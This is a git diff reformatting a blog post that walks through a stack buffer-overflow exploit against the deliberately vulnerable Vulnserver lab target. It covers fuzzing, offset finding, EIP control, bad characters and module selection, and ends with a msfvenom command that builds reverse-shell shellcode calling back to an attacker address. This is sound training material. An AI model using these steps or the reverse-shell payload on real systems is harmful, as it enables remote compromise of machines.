@@ -1,12 +1,17 @@
 ---
-title: Buffer overflows
-author: Cerbersec
-layout: post
+layout: article
+title: Buffer Overflows
+tags: buffer-overflow
+date: 2020-01-22 08:00:00 +0100
+article_header:
+  type: cover
+  image:
+    src: /assets/images/banner-wide.png
 ---
 
-Today I take a look at the [Buffer Overflows Made Easy](https://www.youtube.com/watch?v=qSnPayW6F7U&list=PLLKT__MCUeix3O0DPbmuaRuR_4Hxo4m3G) course by [The Cyber Mentor](https://www.youtube.com/channel/UC0ArlFuFYMpEewyRBzdLHiw).
+Today I take a look at the [Buffer Overflows Made Easy](https://www.youtube.com/watch?v=qSnPayW6F7U&list=PLLKT__MCUeix3O0DPbmuaRuR_4Hxo4m3G) course by [The Cyber Mentor](https://www.youtube.com/channel/UC0ArlFuFYMpEewyRBzdLHiw).<!--more-->
 
-<h2>Anatomy of Memory</h2>
+## Anatomy of Memory
 Virtual memory consists of kernel-space, user-space and the MBR/BIOS. Kernel-space can access user-space, user-space cannot access kernel-space, this would result in a SEGFAULT.
 Each process has a segment in memory, processes related to the correct functionality of the Operating System will run in Kernel-mode, other generic software and applications will run in user-mode.
 
@@ -16,7 +21,7 @@ Each thread of a process gets a **stack**. The stack is memory set asside for st
 
 ![anatomy of memory](/assets/images/bof-anatomy-of-memory.jpg)
 
-<h2>Anatomy of The Stack</h2>
+## Anatomy of The Stack
 The stack is created with an actual stack data structure, it starts with a high address (eg. `0xffffffff`) and grows to a lower address (eg. `0x00000000`) and works according to the Last In First Out (LIFO) principle. Because of this, it is easy to allocate and deallocate blocks on the stack, using a stack pointer (SP). The stack pointer is stored in a special register on the CPU called ESP (extended stack pointer) and initially points to the top of the stack (the highest address on the stack).
 
 Registers:
@@ -37,8 +42,8 @@ By overflowing the stack bufferspace, it is possible to overwrite the EBP and re
 
 ![the stack](/assets/images/bof-stack.png)
 
-<h2>32bit Buffer Overflow</h2>
-<h3>Spiking</h3>
+## 32bit Buffer Overflow
+### Spiking
 Spiking is the process of finding out if something is vulnerable to a BOF. This can be done in multiple ways, most commonly by sending large amounts of data.
 I will spike [Vulnserver](http://www.thegreycorner.com/p/vulnserver.html)'s `TRUN` command using `generic_send_tcp` and monitor the process with [Immunity Debugger](https://debugger.immunityinc.com/).
 
@@ -55,7 +60,7 @@ The `TRUN` command is vulnerable to a bufferoverflow and the ESP, EBP and EIP ha
 
 ![vulnserver bof](/assets/images/bof-vulnserver.png)
 
-<h3>Fuzzing</h3>
+### Fuzzing
 Fuzzing is used to determine when the target program breaks. I will use a python2 script to repeatedly send an increasing buffer until the target crashes.
 
 fuzz.py
@@ -83,7 +88,7 @@ From the output I can tell the target crashed roughly around 2900 bytes.
 
 ![bof fuzz](/assets/images/bof-fuzz.png)
 
-<h3>Finding the offset</h3>
+### Finding the offset
 Before I can overwrite the EIP, I need to find the offset. To do this, I will use Metasploit's `pattern_create`. The `-l` switch will tell pattern_create to use a length of 3500 bytes, as the target crashed roughly around 2900 bytes.
 
 `/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 3500`
@@ -122,7 +127,7 @@ Metasploit finds an exact match at offset 2003.
 
 ![bof offset match](/assets/images/bof-offset-match.png)
 
-<h3>Overwriting EIP</h3>
+### Overwriting EIP
 Now that I have the offset, I can try and control EIP. I'll use a modified version of the offset.py script to set EIP equal to `0x42424242` or `BBBB`.
 
 eip.py
@@ -148,7 +153,7 @@ After executing the script, I can see EIP is now equal to `0x42424242` or `BBBB`
 
 ![controlling eip](/assets/images/bof-eip.png)
 
-<h3>Finding bad characters</h3>
+### Finding bad characters
 Before generating shellcode, I have to figure out what the bad characters are. This can be done by running all the different hex characters through the program, and seeing which ones act up. By default, the nullbyte `0x00` acts up.
 
 I'll use a modified version of my eip.py script with the badchars variable you can find [here](https://bulbsecurity.com/finding-bad-characters-with-immunity-debugger-and-mona-py/). Because `0x00` is a bad character by default, I'll remove it from the variable.
@@ -185,7 +190,7 @@ After running the script, I'll have to look at the hexdump to identify any out o
 
 ![bof badchars](/assets/images/bof-badchars.png)
 
-<h3>Finding the right module</h3>
+### Finding the right module
 I am looking for a DLL or similar module in a program that has no memory protection. Memory protection techniques include:
 
 * Data Execution Prevention (DEP)
@@ -238,7 +243,7 @@ In Immunity Debugger I'll jump to the `625011AF` address and use **F2** to set a
 
 After executing `module.py`, Immunity Debugger will hit the breakpoint at `essfunc.625011AF`.
 
-<h3>Generate shellcode</h3>
+### Generate shellcode
 The final step after controlling EIP and ESP, is generating shellcode. I'll do this with msfvenom, `-p` for payload, `-f` for filetype, `-a` for architecture and `-b` for bad characters.
 
 `msfvenom -p windows/shell_reverse_tcp LHOST=10.0.0.100 LPORT=4444 EXITFUNC=thread -f c -a x86 -b "\x00"`
